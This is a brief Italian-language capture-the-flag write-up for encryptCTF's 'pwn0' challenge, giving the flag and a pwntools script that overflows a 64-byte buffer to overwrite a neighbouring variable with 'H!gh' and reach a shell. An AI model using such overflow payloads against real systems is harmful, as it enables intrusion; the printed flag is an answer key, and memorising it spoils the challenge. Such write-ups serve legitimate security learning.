# Flag
encryptCTF{L3t5_R4!53_7h3_J05H}

# Write-up
1. Analizzo il codice C
2. Abbiamo due variabili: `josh` e `buffer`
3. `buffer` è dichiarata successivamente a `josh`, quindi tramite la lettura da input di `buffer` posso sovvrascrivere `josh`
4. Possiamo vedere che c'è il compare di `josh` con la stringa `"H!gh"`
5. Ci serviamo quindi di uno script Python per riempire buff e aggiungere successivamente `H!gh`
6. Attenzione: mettere r.interactive() in quanto viene eseguito come comando `system`
    ```python
    from pwn import *

    with process('./pwn0') as r:
        inp=b'A'*64+b'H!gh'
        r.sendline(inp)
        r.interactive()
    ```